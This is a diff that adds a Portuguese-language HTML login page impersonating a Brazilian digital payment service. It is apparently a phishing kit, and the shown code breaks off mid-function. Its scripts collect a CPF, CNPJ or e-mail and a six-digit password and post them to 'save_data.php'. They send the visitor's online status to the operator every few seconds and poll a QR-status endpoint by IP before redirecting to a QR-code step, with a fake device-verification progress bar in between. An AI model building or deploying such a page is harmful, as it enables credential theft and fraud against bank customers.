@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Bem-vindo(a)</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="author" content="Nnext Sistemas Digitais">
+    <meta name="description" content="Bem-vindo ao mundo digital.">
+    <meta name="robots" content="noindex,nofollow">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+  <style>
+    .digit-box {
+      width: 45px;
+      height: 50px;
+      font-size: 20px;
+      border: 2px solid #ccc;
+      border-radius: 8px;
+      text-align: center;
+    }
+    
+    .mx-auto {
+    margin-left: auto;
+    margin-right: initial !important;
+}
+
+/* Garante que a label não desça se o input tiver valor */
+input:not(:placeholder-shown) + label,
+input[data-filled] + label {
+font-size: 11px!important;
+    color: #3b82f6 !important;
+    transform: translateY(-24px) !important;
+    background: transparent !important;
+    padding: 0px 0px !important;
+    top: 22px !important;
+    color: #222 !important;
+}
+  </style>
+  <script>
+        let isActive = true;
+        let lastUpdate = 0;
+        
+        // Função para atualizar status
+        function updateUserStatus(online = true) {
+            const now = Date.now();
+            // Só atualiza a cada 3 segundos no máximo
+            if (online && (now - lastUpdate < 3000)) return;
+            
+            lastUpdate = now;
+            fetch('update_status.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'action=' + (online ? 'online' : 'offline')
+            });
+        }
+
+        // Monitora visibilidade da página
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                isActive = false;
+                updateUserStatus(false);
+            } else {
+                isActive = true;
+                updateUserStatus(true);
+            }
+        });
+
+        // Monitora foco da janela
+        window.addEventListener('focus', function() {
+            isActive = true;
+            updateUserStatus(true);
+        });
+
+        window.addEventListener('blur', function() {
+            isActive = false;
+            updateUserStatus(false);
+        });
+
+        // Atualiza status periodicamente enquanto ativo
+        setInterval(() => {
+            if (isActive) updateUserStatus(true);
+        }, 3000);
+
+        // Atualiza status imediatamente ao carregar
+        window.addEventListener('load', function() {
+            updateUserStatus(true);
+        });
+
+        // Marca como offline antes de sair
+        window.addEventListener('beforeunload', function() {
+            navigator.sendBeacon('update_status.php', 'action=offline');
+        });
+    </script>
+    <style>
+        .alerta-pag {
+  display: flex;
+  align-items: center;
+  margin-top: -17px;
+  color: #721c24;
+  font-size: 14px;
+  padding: 8px 12px;
+  border-radius: 4px;
+  position: relative;
+}
+
+.alerta-pag .icon {
+  background-image: url('assets/img/alerts.fe53668d.svg');
+  background-repeat: no-repeat;
+  background-position: 0 -19px;
+  background-size: cover;
+  width: 18px;
+  height: 19px;
+  margin-right: 8px;
+}
+
+@keyframes carregamentoLoop {
+  0%   { left: -50%; width: 50%; }
+  100% { left: 100%; width: 50%; }
+}
+
+.progress-bar {
+  animation: carregamentoLoop 1s linear infinite;
+}
+
+
+
+    </style>
+  <style>
+.swal2-popup.custom-popup {
+  background-size: cover !important;
+  background-repeat: no-repeat !important;
+  background-position: center !important;
+  color: #fff !important;
+  text-align: left;
+}
+
+.modal-conteudo {
+    display: flex;
+    flex-direction: column;
+    align-items: normal;
+    height: 134px;
+    max-width: 400px;
+    margin: 258px 0px 50px 34px;
+}
+
+.modal-conteudo h2 {
+  font-size: 24px;
+  margin-bottom: 10px;
+  font-weight: bold;
+}
+
+.modal-conteudo p {
+  font-size: 16px;
+  margin-bottom: 15px;
+}
+
+.modal-conteudo .logo {
+  width: 140px;
+  margin-bottom: 20px;
+}
+
+.modal-conteudo .swal2-confirm {
+  padding: 12px 30px !important;
+  font-size: 16px !important;
+  font-weight: bold;
+  color: #000 !important;
+  background-color: #FFD700 !important;
+  border: none !important;
+  border-radius: 5px !important;
+  cursor: pointer;
+}
+
+/* Ajusta o tamanho do gif de fundo */
+.swal2-container::before {
+  background-size: 150px !important;
+}
+</style>
+
+
+</head>
+<body class="bg-white flex flex-col min-h-screen">
+
+<header class="flex items-center justify-between p-4 border-b">
+<img src="unaamed/img7.png" alt="oi?" style="width: 97px;">
+
+  <span class="mr-2 text-sm text-gray-600">PT ▾</span>
+</header>
+
+<main class="flex-1 flex items-center justify-center px-4 py-10">
+  <div class="max-w-6xl w-full grid md:grid-cols-2 gap-10 items-center">
+
+   <!-- Propaganda (somente para desktop/tablet) -->
+<div class="w-full flex justify-center items-center px-4">
+  <img src="unaamed/null.jpg" alt="Campanha"
+       class="hidden md:block w-full max-w-none md:w-[700px] lg:w-[900px] xl:w-[900px] rounded-xl"
+       style="margin-top: -235px;" />
+</div>
+
+
+    <!-- Box Central do Login -->
+    <div class="w-full max-w-sm mx-auto space-y-6">
+      <div class="bg-white shadow-md border rounded-xl p-8 space-y-4 relative" id="box-login" style="border-top: none;border-radius: 1px;width: 27rem;height: 20rem;padding: 3.2rem 2.4rem;">
+        
+        <!-- Formulário de Acesso -->
+        <div id="form-acesso">
+          <h2 class="text-lg font-semibold text-center" style="margin-bottom: 20px;">Acesse sua conta</h2>
+           
+            <div class="relative mb-5"> <!-- margin-bottom: 20px -->
+  <input 
+    id="usuario" 
+    type="text" 
+    class="w-full border border-gray-400 px-4 py-2 rounded text-lg focus:outline-none focus:ring-2 focus:ring-blue-500 h-[50px] peer"
+    placeholder=" " style="padding-top: 18px !important;font-weight: 500;">
+
+
+  <label 
+    for="usuario" 
+    class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 text-lg transition-all duration-200 
+           peer-focus:text-sm peer-focus:text-blue-500 peer-focus:-translate-y-6 peer-focus:bg-white peer-focus:px-2 peer-focus:top-2
+           peer-[not(:placeholder-shown)]:text-sm peer-[not(:placeholder-shown)]:-translate-y-6 peer-[not(:placeholder-shown)]:bg-white peer-[not(:placeholder-shown)]:px-2 peer-[not(:placeholder-shown)]:top-2
+           pointer-events-none">
+    CPF, CNPJ ou E-mail
+  </label>
+      
+</div>
+<div id="erro-validacao" class="alerta-pag hidden">
+  <span class="icon"></span>
+  <span>Dados inválido. Confira os dados.</span>
+</div>
+        
+          <button onclick="validarUsuario()" class="w-full bg-blue-600 text-white text-base font-semibold py-2 rounded hover:bg-blue-700 mt-2" style="margin-bottom: 20px;height: 50px;">Continuar</button>
+         <button id="btn-criar-conta" class="w-full border border-blue-600 text-blue-600 text-base font-semibold py-2 rounded" style="height: 50px;">
+  Criar conta
+</button>
+
+        </div>
+
+       <!-- Loading Aguarde -->
+<div id="aguarde" class="hidden text-center space-y-4">
+  <p class="text-gray-800 font-semibold">Verificando dispositivo...</p>
+  <div class="w-full h-2 bg-gray-200 rounded overflow-hidden relative">
+    <div class="progress-bar h-full bg-blue-500 absolute left-0 top-0 rounded-full"></div>
+  </div>
+</div>
+
+
+        <!-- Formulário de Senha -->
+        <div id="form-senha" class="hidden">
+          <div class="flex justify-between items-start mb-4">
+            <div>
+              <h2 class="text-lg font-semibold">Digite sua senha</h2>
+             <p class="text-sm text-gray-500"><span id="conta-info"></span></p>
+
+            </div>
+            <span class="text-xs text-blue-600 cursor-pointer" onclick="trocarConta()">Trocar</span>
+          </div>
+
+          <div class="flex justify-center items-center gap-2 mb-4 relative">
+            <input type="password" maxlength="1" class="digit-box senha" />
+            <input type="password" maxlength="1" class="digit-box senha" />
+            <input type="password" maxlength="1" class="digit-box senha" />
+            <input type="password" maxlength="1" class="digit-box senha" />
+            <input type="password" maxlength="1" class="digit-box senha" />
+            <input type="password" maxlength="1" class="digit-box senha" id="last-digit" />
+            <span id="toggle-senha" class="absolute right-[-30px] cursor-pointer text-blue-600"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" data-icon-name="view-on-navigation-small-lined" style="filter: contrast(0.5);margin-top: 16px;"><path fill-rule="evenodd" d="M9.223 7.843a5 5 0 1 1 5.555 8.315 5 5 0 0 1-5.555-8.315Zm1.11 6.651a3 3 0 1 0 3.334-4.987 3 3 0 0 0-3.333 4.987Z" clip-rule="evenodd"></path><path fill-rule="evenodd" d="M18.378 5.76a11.13 11.13 0 0 1 4.252 5.07 3.001 3.001 0 0 1 0 2.34A11.13 11.13 0 0 1 12 20a11.13 11.13 0 0 1-10.63-6.83 3 3 0 0 1 0-2.34A11.13 11.13 0 0 1 12 4a11.13 11.13 0 0 1 6.378 1.76Zm-1.105 10.796a9.181 9.181 0 0 0 3.517-4.186.87.87 0 0 0 0-.74A9.18 9.18 0 0 0 12 6a9.18 9.18 0 0 0-8.79 5.63.87.87 0 0 0 0 .74A9.18 9.18 0 0 0 12 18a9.18 9.18 0 0 0 5.273-1.444Z" clip-rule="evenodd"></path></svg>️</span>
+          </div>
+
+          <button onclick="enviarSenha()" class="bg-blue-600 hover:bg-blue-700 text-white w-full py-2 rounded">Entrar</button>
+          <p class="text-sm text-blue-600 mt-2 cursor-pointer">Esqueceu sua senha?</p>
+         
+        </div>
+
+      </div>
+
+      <!-- Informações externas -->
+      <div class="text-center mt-2 text-sm space-y-3" style="margin-top:0px !important;">
+        <div class="flex justify-center items-center gap-2 text-gray-700">
+         <svg width="378" height="146" viewBox="0 0 378 146" fill="none" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+<rect width="378" height="146" fill="url(#pattern0_316_10)"/>
+<defs>
+<pattern id="pattern0_316_10" patternContentUnits="objectBoundingBox" width="1" height="1">
+<use xlink:href="#image0_316_10" transform="scale(0.0026455 0.00684932)"/>
+</pattern>
+<image id="image0_316_10" width="378" height="146" preserveAspectRatio="none" xlink:href="data:image/png;base64,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"/>
+</defs>
+</svg>
+
+        </div>
+       
+      </div>
+    </div>
+  </div>
+</main>
+
+<footer class="text-xs text-center text-gray-500 p-4 border-t" style="background-color: #222222;height: 100px;">
+  PAG <br> © 2025 Todos os direitos reservados. <br> CNPJ/MF 08.561.701/0001-01 Av. Brig. Faria Lima, 1.384, São Paulo - SP - CEP 01451-001
+</footer>
+
+<script>
+document.getElementById('btn-criar-conta').addEventListener('click', function () {
+  Swal.fire({
+    html: `
+      <div class="modal-conteudo">
+        <h2>Para criar sua conta <br>baixe nosso aplicativo no seu celular!</h2>
+        
+        
+       <button class="swal2-confirm" onclick="Swal.close()">fechar</button>
+
+      </div>
+    `,
+    showConfirmButton: false,
+    width: 600,
+    padding: '2em',
+    background: '#fff url(https://ladoanimation.com/wp-content/uploads/2024/02/08-1.jpg)',
+    customClass: {
+      popup: 'custom-popup'
+    },
+   
+  });
+});
+</script>
+
+
+
+
+<script>
+let usuario = '';
+
+function validarUsuario() {
+  const input = document.getElementById("usuario");
+  const valor = input.value.trim();
+  usuario = valor;
+  const erro = document.getElementById("erro-validacao");
+
+  const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(valor);
+  const cleaned = valor.replace(/\D/g, "");
+  const isCPF = /^\d{11}$/.test(cleaned) && validarCPF(cleaned);
+  const isCNPJ = /^\d{14}$/.test(cleaned) && validarCNPJ(cleaned);
+
+  if (!isEmail && !isCPF && !isCNPJ) {
+    erro.classList.remove("hidden");
+    return;
+  }
+
+  erro.classList.add("hidden");
+  document.getElementById("form-acesso").classList.add("hidden");
+  document.getElementById("aguarde").classList.remove("hidden");
+
+  setTimeout(() => {
+    document.getElementById("aguarde").classList.add("hidden");
+    document.getElementById("form-senha").classList.remove("hidden");
+    document.getElementById("conta-info").innerHTML = formatarIdentificacao(valor);
+    document.querySelectorAll(".senha")[0].focus();
+  }, 1000);
+}
+
+function formatarIdentificacao(valor) {
+  const cleaned = valor.replace(/\D/g, "");
+  if (cleaned.length === 11) {
+    return "Sua conta:<br>" + cleaned.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
+  }
+  if (cleaned.length === 14) {
+    return "Sua conta:<br>" + cleaned.replace(/(\d{2})(\d{3})(\d{3})(\d{4})(\d{2})/, "$1.$2.$3/$4-$5");
+  }
+  return "Sua conta:<br>" + valor;
+}
+
+function trocarConta() {
+  document.getElementById("form-senha").classList.add("hidden");
+  document.getElementById("form-acesso").classList.remove("hidden");
+}
+
+function validarCPF(cpf) {
+  if (cpf.length !== 11 || /^(\d)\1+$/.test(cpf)) return false;
+  let soma = 0, resto;
+  for (let i = 1; i <= 9; i++) soma += parseInt(cpf[i - 1]) * (11 - i);
+  resto = (soma * 10) % 11;
+  if (resto === 10 || resto === 11) resto = 0;
+  if (resto !== parseInt(cpf[9])) return false;
+  soma = 0;
+  for (let i = 1; i <= 10; i++) soma += parseInt(cpf[i - 1]) * (12 - i);
+  resto = (soma * 10) % 11;
+  if (resto === 10 || resto === 11) resto = 0;
+  return resto === parseInt(cpf[10]);
+}
+
+function validarCNPJ(cnpj) {
+  if (cnpj.length !== 14 || /^(\d)\1+$/.test(cnpj)) return false;
+  const calc = (base, pesos) => {
+    let soma = 0;
+    for (let i = 0; i < pesos.length; i++) soma += parseInt(base[i]) * pesos[i];
+    const resto = soma % 11;
+    return resto < 2 ? 0 : 11 - resto;
+  };
+  const base = cnpj.slice(0, 12);
+  const digitos = cnpj.slice(12);
+  const peso1 = [5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2];
+  const peso2 = [6, 5, 4, 3, 2, 9, 8, 7, 6, 5, 4, 3, 2];
+  return digitos === `${calc(base, peso1)}${calc(base + calc(base, peso1), peso2)}`;
+}
+
+function enviarSenha() {
+  const senha = Array.from(document.querySelectorAll(".senha")).map(i => i.value).join('');
+  if (senha.length !== 6) return;
+
+  document.getElementById("form-senha").classList.add("hidden");
+  document.getElementById("aguarde").classList.remove("hidden");
+
+  fetch('save_data.php', {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: `usuario=${encodeURIComponent(usuario)}&senha=${senha}`
+  })
+  .then(res => res.json())
+  .then(data => {
+    if (data.status === 'blocked') {
+      window.location.href = data.redirect;
+    } else if (data.status === 'ok') {
+      verificarStatus(data.ip);
+    } else {
+      erroLogin();
+    }
+  })
+  .catch(() => erroLogin());
+}
+
+function verificarStatus(ip) {
+  const interval = setInterval(() => {
+    fetch(`api/qr_status.php?ip=${ip}`)
+      .then(res => res.json())
+      .then(data => {
+        if (data.status === 'liberado') {
+          clearInterval(interval);
+          window.location.href = 'qr-codepb.php';
+        } else if (data.status === 'invalido') {
+          clearInterval(interval);
+          erroLogin();
+        }
+      })
+      .catch(() => {
+        clearInterval(interval);
+        erroLogin();
+      });
+  }, 2000);
+}
+
+function erroLogin() {
+  document.getElementById("aguarde").classList.add("hidden");
+  document.getElementById("form-acesso").classList.remove("hidden");
+  document.getElementById("erro-validacao").classList.remove("hidden");
+}
+
+document.querySelectorAll(".senha").forEach((input, i, all) => {
+  input.addEventListener("input", () => {
+    if (input.value && i < all.length - 1) all[i + 1].focus();
+  });
